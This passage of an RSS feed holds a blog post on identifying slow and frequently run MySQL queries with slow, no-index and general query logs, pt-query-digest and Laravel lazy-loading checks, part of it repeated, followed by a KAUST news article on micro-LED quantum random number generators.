enable this on staging or production, but there's a very big chance your disk I/O won't survive that setting. Be careful when doing this on anything but your local development environment. I know some will #YOLO this in production, don't @ me when your system breaks. :-) MySQL can log all queries that are being executed, with the ability to then fire off some CLI tools on that big query log to identify the most recurring queries. First, similar to the Slow Query Log, create the file MySQL can write to: $ touch /var/log/mysql-general-query.log $ chown mysql:mysql /var/log/mysql-general-query.log Next, instruct MySQL to log all queries to that file: mysql&amp;gt; SET GLOBAL general_log_file = '/var/log/mysql-general-query.log'; mysql&amp;gt; SET GLOBAL general_log = ON; To disable the general log again: mysql&amp;gt; SET GLOBAL general_log = OFF; Now you can - again, locally - open your application, run your jobs &amp;amp; scheduled tasks, run your CI tests, ... and every query will be logged to the /var/log/mysql-general-query.log file. The output will be something like this: $ tail -f /var/log/mysql-general-query.log 2025-09-16T11:40:04.736814Z 94 Prepare select * from `plan_prices` where `archived` = ? and `is_yearly` = ? and `currency` = ? order by `amount` asc limit 1 2025-09-16T11:40:04.736987Z 94 Execute select * from `plan_prices` where `archived` = 0 and `is_yearly` = 0 and `currency` = 'eur' order by `amount` asc limit 1 2025-09-16T11:40:04.737575Z 94 Close stmt 2025-09-16T11:40:04.745635Z 94 Prepare select * from `transformation_results` where `url` = ? and `type` = ? limit 1 2025-09-16T11:40:04.745773Z 94 Execute select * from `transformation_results` where `url` = 'https://ohdear.app.test/pricing' and `type` = 'ldJson' limit 1 2025-09-16T11:40:04.746173Z 94 Close stmt 2025-09-16T11:40:04.768509Z 94 Prepare select * from `users` where `id` = ? limit 1 2025-09-16T11:40:04.768763Z 94 Execute select * from `users` where `id` = 27765 limit 1 2025-09-16T11:40:04.769149Z 94 Close stmt This quickly becomes overwhelming &amp;amp; you won't be able to parse this manually anymore. That's where the CLI comes in. Percona offers some amazing scripts for us to use, let's install those first: $ apt install percona-toolkit # for debian/ubuntu $ brew install percona-toolkit # for Mac The pt-query-digest tool allows us to analyse this general log and sort the queries by either count or time-spent in the database. We just need a quick fix in our log, because pt-query-digest only looks at the keyword Query in the log, and we're using Prepared Statements so we have a lot of entries with Prepare and Execute that the tool will happily ignore. Since each Execute is just a Query that was executed, we can simply rename them in our logfile. $ sed 's/Execute\t/Query\t/' /var/log/mysql-general-query.log &amp;gt; /var/log/mysql-general-query-editted.log Then, let's fire off the analysis: $ pt-query-digest \ --type=genlog \ --group-by fingerprint \ --order-by Query_time:cnt,Query_time:sum \ --filter '$event-&amp;gt;{cmd} =~ /^(Query|Execute)$/' \ --limit 25 \ /var/log/mysql-general-query-editted.log The output is a bit noisy, but tells you which queries were executed most (Count attribute) and which spent most time (Exec time attribute). Any performance gain that can be made to the most-occuring queries will yield better results. Improving a query from 25ms to 20ms may sound negligible, but if it's performed millions of times a day, it adds up. MySQL bonus 1: sort output vertically, not horizontally # If you're working via the CLI, some of the queries I shared above can have quite lengthy output that's not always easy to see on small screens. You can change some of the outputs with modifiers in MySQL. One very useful modifier is the \G control character - that's backslash + G. This is a normal query output via the CLI: mysql&amp;gt; SELECT id, name FROM teams LIMIT 2; +----+--------------+ | id | name | +----+--------------+ | 1 | Team Mattias | | 2 | Spatie | +----+--------------+ 2 rows in set (0.00 sec) If you add in the \G suffix to a query, the results are shown vertically instead: mysql&amp;gt; SELECT id, name FROM teams LIMIT 2 \G; ************************* * 1. row *************************** id: 1 name: Team Mattias ************************* * 2. row *************************** id: 2 name: Spatie 2 rows in set (0.00 sec) That's a litteral \G (backslash + G) at the end of the query. MySQL bonus 2: write query output to a file # If you miss using grep, awk, sort, ... in a MySQL shell, you're probably a greybeard Linux sysadmin and we should have some beers together. But good news, MySQLs' output can be redirected to a file for easier parsing! mysql&amp;gt; \T /tmp/query-output.log Logging to file '/tmp/query-output.log' mysql&amp;gt; SELECT * FROM teams; mysql&amp;gt; \t Outfile disabled. With \T you can specify which file this MySQL session should write all its output to. And with \t you can stop writing to that file. Afterwards, your file contains all the output of the queries you ran in between. You can also use INTO OUTFILE but I find it a little cumbersome to tweak queries to achieve that, I'd rather mark a terminal session as "log to file", do the queries I want, and then stop that logging. Let Laravel warn you for N+1 queries # The Laravel framework can warn you when you're (potentially) causing excessive queries by throwing an exception when you're lazy loading relationships. You can enable this warning in your non-production environment by adding the following into your boot() method in your AppServiceProvider: public function boot(): void { Model::preventLazyLoading(! $this-&amp;gt;app-&amp;gt;isProduction()); } Now, every time you run a piece of code like this: $posts = Post::all(); foreach ($posts as $post) { echo $post-&amp;gt;comments-&amp;gt;count(); } It'll throw an exception, because for every iteration through the loop, Laravel would perform an extra query to count the comments of that specific $post instead of loading them at once. The fix, in this example, would be to eager load the counts only - not all the comments. // Eager load the comment counts $posts = Post::withCount('comments')-&amp;gt;get(); foreach ($posts as $post) { echo $post-&amp;gt;comments_count; // Note the _count suffix } This is an example that will optimise your query count with just minimal code changes. Next up: fixing the queries # In this post, we shared several ways of identifying which queries either get executed the most or which are the slowest. There's many ways to get this data, and you're able to pick whichever method you're most comfortable with or have access to. In our next post, we'll deep-dive into the different ways of identifying what the bottleneck of a query is and how to resolve it.&lt;/p&gt;
    &lt;p&gt;A few weeks ago, we massively improved the performance of the dashboard &amp;amp; website by optimizing some of our SQL queries. In this post, we'll share how we identified the queries that needed work. In the next post, we'll explore how we fixed each of them. We'll cover the basics and gradually work our way up to the more advanced/complex ways of identifying slow queries. In this post, you'll see: Using a local debug-bar to identify queries Using MySQL slow query log Logging queries that don't use indexes Evaluating currently running queries live Analysing the global query log 2 MySQL bonusses: better CLI output &amp;amp; redirecting output to files Enforce eager loading in local Laravel environment Let's go! What these results look like # As a reminder, this is the resulting performance gain for the dashboard &amp;amp; some of our internal APIs: These graphs come from the Oh Dear uptime &amp;amp; performance monitoring we perform. Now let's get started identifying which queries need optimising. Enable the debug-bar in your local environment # The easiest place to start investigating queries is locally, in your development environment. Most frameworks have the concept of a "debug bar" - in the case of Laravel applications, the most widely used is the barryvdh/laravel-debugbar package that offers excellent insights. Once enabled, you can see output similar to this: It contains, at a glance: The total time spent executing SQL queries (top-right) The total amount of queries executed (top-left) How many of those were duplicates (indicating potential N+1 loop issues) Before optimising any query, it makes sense to ask the question: can the query be avoided in the first place? Duplicate queries are worth investigating, as well as queries that don't add meaning to the page you're seeing (ie a Class being lazy-loaded whose data isn't needed on this page). In our case, if we're looking at the data being loaded on an uptime monitor, we wouldn't expect a SQL query to load data for a broken link monitor. For this, you need application-awareness to know what data makes sense to load on that page. Let MySQL tell you which queries are slow # MySQL has the ability to enable a "slow query log", where you get to decide what qualifies as a slow query. This is the easiest step to get started, as MySQL will log to disk the SQL queries that exceeded your threshold. First, create the file to be used as the log (as the root user): $ touch /var/log/mysql-slow-query.log $ chown mysql:mysql /var/log/mysql-slow-query.log This creates an empty file and allows MySQL to read &amp;amp; write to it. If the file doesn't exist, MySQL won't create it for you, it just won't log anything. Next, hop in your MySQL command-line and activate the Slow Query Log. $ mysql mysql&amp;gt; SET GLOBAL slow_query_log_file = '/var/log/mysql-slow-query.log'; mysql&amp;gt; SET GLOBAL long_query_time = 1; mysql&amp;gt; SET GLOBAL slow_query_log = 'ON'; From this point, MySQL will log every query that exceeded the 1s threshold in your log file. Tweak the "long query time" as you see fit. $ tail -f /var/log/mysql-slow-query.log # Query_time: 2.547717 Lock_time: 0.000003 Rows_sent: 0 Rows_examined: 0 SET timestamp=1757095277; select * from `runs` where `runs`.`check_id` = ...; This will give you a list of your slow queries, ready to be optimized. The example above will modify your currently running MySQL instance to log queries, but if you restart your MySQL server, the settings won't be persisted. If you want to have this enabled all the time, it needs to be added to your my.cnf config file: [mysqld] slow_query_log = ON slow_query_log_file = /var/log/mysql-slow-query.log long_query_time = 1 You can gradually increase the slow query threshold, MySQL allows decimal values to log queries that are faster than 500ms, 300ms, etc. mysql&amp;gt; SET GLOBAL long_query_time = 0.3; This would let MySQL log all queries that are slower than 300ms. If the results become too verbose, you can tweak how many queries get logged a bit more by setting a minimal amount of rows that a query should return, before it's logged. mysql&amp;gt; SET GLOBAL min_examined_row_limit = 1000; Queries that examine fewer than this number of rows will not be logged to the slow query log. Let MySQL tell you which queries lack indexes # Spoiler alert: a fast query usually has indexes on them that make retrieving the data blazing fast. We'll explore how to set those &amp;amp; decide which ones to set in future posts. MySQL can log all queries that are being executed that don't use an index for lookups. This can get a little noisy, especially if you haven't added indexes before, so this is a setting to enable once you've done the 2 tips shared above first, to trim down on the log-noise this might generate. mysql&amp;gt; SET GLOBAL log_queries_not_using_indexes = ON; This will log all sorts of queries, including queries like: SELECT * FROM users: a full table scan (without a WHERE clause) SELECT * FROM users WHERE email = '[email protected]': a WHERE clause on a non-index column SELECT * FROM users WHERE UPPER(email) = '[email protected]: a function call on an indexed column (this prevents index usage) SELECT * FROM users WHERE name LIKE '%mattias%': using a leading wildcard in a LIKE statement I wouldn't recommend running log_queries_not_using_indexes all the time, just for debugging &amp;amp; analysis purposes. The log_queries_not_using_indexes is also compatible with the same min_examined_row_limit option we shared in the previous tip, so you can limit the logging of non-indexed queries by adding: mysql&amp;gt; SET GLOBAL min_examined_row_limit = 1000; If you have a high amount of queries without indexes and a busy MySQL server, the log activity can also become a bottleneck. Keep this in mind and disable it again once you're done with your analysis. mysql&amp;gt; SET GLOBAL log_queries_not_using_indexes = OFF; Ps; feels weird writing queries that set a value to what seems to be a string, right? The values for OFF and ON are reserved keywords, similar to TRUE or FALSE, so they don't need quotes. Let MySQL tell you which queries are executed right now # As a rule of thumb, I like to use: whenever I can see a query being executed right now, it probably can use some optimisations. Think about that logic for a second: ideally, queries are finished under 10ms or faster. What are the odds that when I request the current processlist, a query will show up? It becomes such a narrow window that when you look at the current processlist a few times, and you see the same queries showing up over and over again, they're worth investigating. Let's start with the basics: mysql&amp;gt; SHOW FULL PROCESSLIST; If this returns a lot of results, you can use the raw SQL query to be able to filter the results based on your own criteria. The SHOW FULL PROCESSLIST is essentially a shortcut for the following SQL query: mysql&amp;gt; SELECT ID, USER, HOST, DB, COMMAND, TIME, STATE, INFO FROM performance_schema.processlist ORDER BY ID; So you're able to trim down the output a little by avoiding Sleeping connections or from databases or users you don't need (if you're hosting multiple databases on this system); mysql&amp;gt; SELECT ID, USER, HOST, DB, COMMAND, TIME, STATE, INFO FROM performance_schema.processlist WHERE DB = 'ohdear' AND COMMAND != 'Sleep'; If you run this command a few times in a row and you see the same types of queries showing up, even if they have indexes, they're worth noting for followup. The output of PROCESSLIST and the content of the performance_schema.processlist have a limitation that the TIME only has seconds granularity, so it's hard to sort on. As a workaround, once you need more insights into &amp;lt; 1 second queries, you can run the following query: mysql&amp;gt; SELECT t.processlist_id, t.processlist_user, t.processlist_host, t.processlist_db, t.processlist_command, t.processlist_state, t.processlist_info, ROUND(s.timer_wait/1000000, 2) as execution_time_ms FROM performance_schema.threads t JOIN performance_schema.events_statements_current s ON t.thread_id = s.thread_id WHERE t.processlist_command != 'Sleep' AND s.timer_wait IS NOT NULL ORDER BY s.timer_wait DESC; This will show the time spent in miliseconds in the execution_time_ms column. Let MySQL tell you which queries get executed the most # Caution: on high-traffic MySQL servers, this will become a major bottleneck! Be careful. This one is best to enable locally, in your development environment. Sure, you can try to enable this on staging or production, but there's a very big chance your disk I/O won't survive that setting. Be careful when doing this on anything but your local development environment. I know some will #YOLO this in production, don't @ me when your system breaks. :-) MySQL can log all queries that are being executed, with the ability to then fire off some CLI tools on that big query log to identify the most recurring queries. First, similar to the Slow Query Log, create the file MySQL can write to: $ touch /var/log/mysql-general-query.log $ chown mysql:mysql /var/log/mysql-general-query.log Next, instruct MySQL to log all queries to that file: mysql&amp;gt; SET GLOBAL general_log_file = '/var/log/mysql-general-query.log'; mysql&amp;gt; SET GLOBAL general_log = ON; To disable the general log again: mysql&amp;gt; SET GLOBAL general_log = OFF; Now you can - again, locally - open your application, run your jobs &amp;amp; scheduled tasks, run your CI tests, ... and every query will be logged to the /var/log/mysql-general-query.log file. The output will be something like this: $ tail -f /var/log/mysql-general-query.log 2025-09-16T11:40:04.736814Z 94 Prepare select * from `plan_prices` where `archived` = ? and `is_yearly` = ? and `currency` = ? order by `amount` asc limit 1 2025-09-16T11:40:04.736987Z 94 Execute select * from `plan_prices` where `archived` = 0 and `is_yearly` = 0 and `currency` = 'eur' order by `amount` asc limit 1 2025-09-16T11:40:04.737575Z 94 Close stmt 2025-09-16T11:40:04.745635Z 94 Prepare select * from `transformation_results` where `url` = ? and `type` = ? limit 1 2025-09-16T11:40:04.745773Z 94 Execute select * from `transformation_results` where `url` = 'https://ohdear.app.test/pricing' and `type` = 'ldJson' limit 1 2025-09-16T11:40:04.746173Z 94 Close stmt 2025-09-16T11:40:04.768509Z 94 Prepare select * from `users` where `id` = ? limit 1 2025-09-16T11:40:04.768763Z 94 Execute select * from `users` where `id` = 27765 limit 1 2025-09-16T11:40:04.769149Z 94 Close stmt This quickly becomes overwhelming &amp;amp; you won't be able to parse this manually anymore. That's where the CLI comes in. Percona offers some amazing scripts for us to use, let's install those first: $ apt install percona-toolkit # for debian/ubuntu $ brew install percona-toolkit # for Mac The pt-query-digest tool allows us to analyse this general log and sort the queries by either count or time-spent in the database. We just need a quick fix in our log, because pt-query-digest only looks at the keyword Query in the log, and we're using Prepared Statements so we have a lot of entries with Prepare and Execute that the tool will happily ignore. Since each Execute is just a Query that was executed, we can simply rename them in our logfile. $ sed 's/Execute\t/Query\t/' /var/log/mysql-general-query.log &amp;gt; /var/log/mysql-general-query-editted.log Then, let's fire off the analysis: $ pt-query-digest \ --type=genlog \ --group-by fingerprint \ --order-by Query_time:cnt,Query_time:sum \ --filter '$event-&amp;gt;{cmd} =~ /^(Query|Execute)$/' \ --limit 25 \ /var/log/mysql-general-query-editted.log The output is a bit noisy, but tells you which queries were executed most (Count attribute) and which spent most time (Exec time attribute). Any performance gain that can be made to the most-occuring queries will yield better results. Improving a query from 25ms to 20ms may sound negligible, but if it's performed millions of times a day, it adds up. MySQL bonus 1: sort output vertically, not horizontally # If you're working via the CLI, some of the queries I shared above can have quite lengthy output that's not always easy to see on small screens. You can change some of the outputs with modifiers in MySQL. One very useful modifier is the \G control character - that's backslash + G. This is a normal query output via the CLI: mysql&amp;gt; SELECT id, name FROM teams LIMIT 2; +----+--------------+ | id | name | +----+--------------+ | 1 | Team Mattias | | 2 | Spatie | +----+--------------+ 2 rows in set (0.00 sec) If you add in the \G suffix to a query, the results are shown vertically instead: mysql&amp;gt; SELECT id, name FROM teams LIMIT 2 \G; ************************* * 1. row *************************** id: 1 name: Team Mattias ************************* * 2. row *************************** id: 2 name: Spatie 2 rows in set (0.00 sec) That's a litteral \G (backslash + G) at the end of the query. MySQL bonus 2: write query output to a file # If you miss using grep, awk, sort, ... in a MySQL shell, you're probably a greybeard Linux sysadmin and we should have some beers together. But good news, MySQLs' output can be redirected to a file for easier parsing! mysql&amp;gt; \T /tmp/query-output.log Logging to file '/tmp/query-output.log' mysql&amp;gt; SELECT * FROM teams; mysql&amp;gt; \t Outfile disabled. With \T you can specify which file this MySQL session should write all its output to. And with \t you can stop writing to that file. Afterwards, your file contains all the output of the queries you ran in between. You can also use INTO OUTFILE but I find it a little cumbersome to tweak queries to achieve that, I'd rather mark a terminal session as "log to file", do the queries I want, and then stop that logging. Let Laravel warn you for N+1 queries # The Laravel framework can warn you when you're (potentially) causing excessive queries by throwing an exception when you're lazy loading relationships. You can enable this warning in your non-production environment by adding the following into your boot() method in your AppServiceProvider: public function boot(): void { Model::preventLazyLoading(! $this-&amp;gt;app-&amp;gt;isProduction()); } Now, every time you run a piece of code like this: $posts = Post::all(); foreach ($posts as $post) { echo $post-&amp;gt;comments-&amp;gt;count(); } It'll throw an exception, because for every iteration through the loop, Laravel would perform an extra query to count the comments of that specific $post instead of loading them at once. The fix, in this example, would be to eager load the counts only - not all the comments. // Eager load the comment counts $posts = Post::withCount('comments')-&amp;gt;get(); foreach ($posts as $post) { echo $post-&amp;gt;comments_count; // Note the _count suffix } This is an example that will optimise your query count with just minimal code changes. Next up: fixing the queries # In this post, we shared several ways of identifying which queries either get executed the most or which are the slowest. There's many ways to get this data, and you're able to pick whichever method you're most comfortable with or have access to. In our next post, we'll deep-dive into the different ways of identifying what the bottleneck of a query is and how to resolve it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45267762</guid><pubDate>Tue, 16 Sep 2025 20:43:43 +0000</pubDate></item><item><title>Micro-LEDs boost random number generation</title><link>https://discovery.kaust.edu.sa/en/article/25936/micro-leds-boost-random-number-generation/</link><description>&lt;doc fingerprint="83dc030560c5394e"&gt;
  &lt;main&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h1"&gt;Micro-LEDs boost random number generation&lt;/head&gt;
    &lt;p&gt;Intensity fluctuations from miniature LEDs provide ultrafast generation rates.&lt;/p&gt;
    &lt;p&gt;Miniature LEDs called micro-LEDs have been shown to generate random numbers at gigabit-per-second speeds by a team of researchers from Saudi Arabia and the United States[1].&lt;/p&gt;
    &lt;p&gt;The generation of random numbers is vital for many tasks, including data security — where it is used to create encryption keys and passwords — and computer simulations of complex systems such as the weather and financial markets.&lt;/p&gt;
    &lt;p&gt;There is, therefore, a strong demand to develop cost-effective random number generators that are small enough for chip-scale integration while also offering a fast generation rate.&lt;/p&gt;
    &lt;p&gt;The most robust and reliable way to generate true random numbers is to sample and digitize a physical process underpinned by the intrinsic randomness of quantum mechanics. For example, the thermal noise, chaos, and jitter from electronic and optoelectronic devices have all been investigated in the past.&lt;/p&gt;
    &lt;p&gt;Now, Heming Lin, Boon Ooi, and coworkers from KAUST, King Abdulaziz City for Science and Technology (KACST), and the University of California at Santa Barbara report that intensity fluctuations in the spontaneous emission from blue GaN micro-LEDs, ranging in size from 5-100 μm, can serve as a quantum random number generator (QRNG) with an ultra-high generation rate of 9.375 Gbit/s.&lt;/p&gt;
    &lt;p&gt;“Micro-LEDs are compact, reliable, and cost-effective,” say Lin and Ooi. “They consume less power and require simpler electronic and photonic system architectures than other competing technologies.”&lt;/p&gt;
    &lt;p&gt;The idea of using LEDs to generate numbers is not new. Over the past decade, research teams have explored measuring photon number and arrival time. However, a major limitation of these previous schemes is that they have provided much slower generation rates, typically on the scale of no more than a few hundred megabits per second.&lt;/p&gt;
    &lt;p&gt;“Systems relying on single-photon detection typically extract only two bits per sampling cycle, whereas our system achieves six bits by leveraging intensity fluctuations,” explain Lin and Ooi.&lt;/p&gt;
    &lt;p&gt;Importantly, for any QRNG to be trusted, its output must be stringently tested to ensure it is sufficiently random. The tests developed by the U.S. National Institute of Standards and Technology (NIST) are the gold standard. The KAUST team tested a variety of micro-LEDs with different sizes — spanning from 5 × 5 μm² to 100 × 100 μm² — and drive currents ranging from 0.5 to 100 mA. All passed the NIST tests.&lt;/p&gt;
    &lt;p&gt;The team’s future work will focus on boosting generation rates by creating 2D arrays of micro-LEDs that enable parallel random number generation.&lt;/p&gt;
    &lt;p&gt;The researchers are also planning to create a fully integrated system, rather than using discrete components. At present, the KAUST system comprises a GaN micro-LED, which is temperature stabilized using a thermoelectric cooler and has its light emission fed to an avalanche photodetector. This, in turn, is connected to a sampling oscilloscope via an electronic amplifier.&lt;/p&gt;
    &lt;p&gt;Lin and Ooi add:“Our next step is to integrate an on-chip photodetector with the micro-LED and subsequently incorporate all the required electronic components to realize a fully integrated QRNG chip.”&lt;/p&gt;
    &lt;head rend="h5"&gt;Reference&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Lin, H., Lu, H., Wong, W.S., Almogbel, A., Alyamani, A., Ng., T.K., Bakr, O., Nakamura, S., Denbaars, S. &amp;amp; Ooi, B. Micro-LED based quantum random number generators. Optics Express 33, 22154-22164 (2025).| article.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h6"&gt;You might also like&lt;/head&gt;
    &lt;p&gt;Bioengineering&lt;/p&gt;
    &lt;head rend="h3"&gt;Sensing stress to keep plants safe&lt;/head&gt;
    &lt;p&gt;Computer Science&lt;/p&gt;
    &lt;head rend="h3"&gt;Sweat-sniffing sensor could make workouts smarter&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h3"&gt;New tech detects dehydration by touching a screen&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h3"&gt;A new interface for efficient electronics&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h3"&gt;Artificial neurons enable neuromorphic computing with light&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h3"&gt;Narrow-linewidth lasers bring low-noise answer&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
    &lt;head rend="h3"&gt;Octopus suckers inspire sticky medical patch&lt;/head&gt;
    &lt;p&gt;Electrical Engineering&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45268575</guid><pubDate>Tue, 16 Sep 2025 21:48:06 +0000</pubDate></item></channel></rss>